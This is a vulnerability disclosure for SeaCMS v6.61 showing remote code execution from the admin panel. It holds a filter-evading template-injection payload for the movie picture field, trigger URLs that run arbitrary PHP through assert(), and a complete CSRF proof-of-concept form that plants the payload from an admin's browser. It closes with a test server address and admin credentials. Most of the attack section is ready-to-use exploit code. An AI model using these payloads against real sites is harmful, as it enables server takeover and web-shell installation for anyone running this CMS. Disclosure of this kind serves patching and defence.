# backend RCE in the latest version of SeaCMS(v6.61)

In SeaCMS's admin platform, just in the page of publishing movies,due to the low limitation of the code injected in the picture's url,we can execute random code to getshell.though there are some way's in the /include/main.class to limit the usage of the code,we can find ways to bypass it.
So How does this vul be triggerd? here are some Steps:  
* Firstly login to the admin panel, in this case the admin directory is adjusted to `/backend`.
![](http://p7lc13qga.bkt.clouddn.com/backend.PNG)
* Secondly add a movie and set it's pictrue address as `{if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//}{end if}` 
![](http://p7lc13qga.bkt.clouddn.com/add.png)
* After adding it visit `/details/index.php?1.html&m=admin&a=assert&b=phpinfo();`you can find `phpinfo()` is executed.
here 1.html refers to the id of the video you have just added.In my case, the video's id is 2 so I executed as 2.html.
![](http://p7lc13qga.bkt.clouddn.com/vul.PNG)
* Or you can just visit `/search.php?searchtype=5&tid=0&a=assert&b=phpinfo();`or any other places that display the video's pic you have just added.


Also in the adding movie page it has no csrf protection so we can use CSRF to attacked it.  
csrf poc is here:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
  <!-- adjust action to your url -->
    <form action="http://127.0.0.1/seacms/backend/admin_video.php?action=save&acttype=add" method="POST">
      <input type="hidden" name="v&#95;commend" value="0" />
      <input type="hidden" name="v&#95;name" value="getshell" />
      <input type="hidden" name="v&#95;enname" value="ceshi" />
      <input type="hidden" name="v&#95;color" value="&#35;FF0000" />
      <input type="hidden" name="v&#95;type" value="5" />
      <input type="hidden" name="v&#95;state" value="5" />
      <input type="hidden" name="v&#95;pic" value="{if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//}{end if}" />
      <input type="hidden" name="v&#95;spic" value="" />
      <input type="hidden" name="v&#95;gpic" value="" />
      <input type="hidden" name="v&#95;actor" value="" />
      <input type="hidden" name="v&#95;director" value="" />
      <input type="hidden" name="v&#95;commend" value="0" />
      <input type="hidden" name="v&#95;note" value="" />
      <input type="hidden" name="v&#95;tags" value="" />
      <input type="hidden" name="select3" value="" />
      <input type="hidden" name="v&#95;publishyear" value="" />
      <input type="hidden" name="select2" value="" />
      <input type="hidden" name="v&#95;lang" value="" />
      <input type="hidden" name="select1" value="" />
      <input type="hidden" name="v&#95;publisharea" value="" />
      <input type="hidden" name="select4" value="" />
      <input type="hidden" name="v&#95;ver" value="" />
      <input type="hidden" name="v&#95;hit" value="0" />
      <input type="hidden" name="v&#95;monthhit" value="0" />
      <input type="hidden" name="v&#95;weekhit" value="0" />
      <input type="hidden" name="v&#95;dayhit" value="0" />
      <input type="hidden" name="v&#95;len" value="" />
      <input type="hidden" name="v&#95;total" value="" />
      <input type="hidden" name="v&#95;nickname" value="" />
      <input type="hidden" name="v&#95;company" value="" />
      <input type="hidden" name="v&#95;tvs" value="" />
      <input type="hidden" name="v&#95;douban" value="" />
      <input type="hidden" name="v&#95;mtime" value="" />
      <input type="hidden" name="v&#95;imdb" value="" />
      <input type="hidden" name="v&#95;score" value="" />
      <input type="hidden" name="v&#95;scorenum" value="" />
      <input type="hidden" name="v&#95;longtxt" value="" />
      <input type="hidden" name="v&#95;money" value="0" />
      <input type="hidden" name="v&#95;psd" value="" />
      <input type="hidden" name="v&#95;playfrom&#91;1&#93;" value="" />
      <input type="hidden" name="v&#95;playurl&#91;1&#93;" value="" />
      <input type="hidden" name="m&#95;downfrom&#91;1&#93;" value="" />
      <input type="hidden" name="m&#95;downurl&#91;1&#93;" value="" />
      <input type="hidden" name="v&#95;content" value="" />
      <input type="hidden" name="Submit" value="�&#161;&#174;�&#174;&#154;�&#143;&#144;浜&#164;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

you can test this vul at `http://111.230.11.248:10089/backend/`,and the username and password is admin|admin.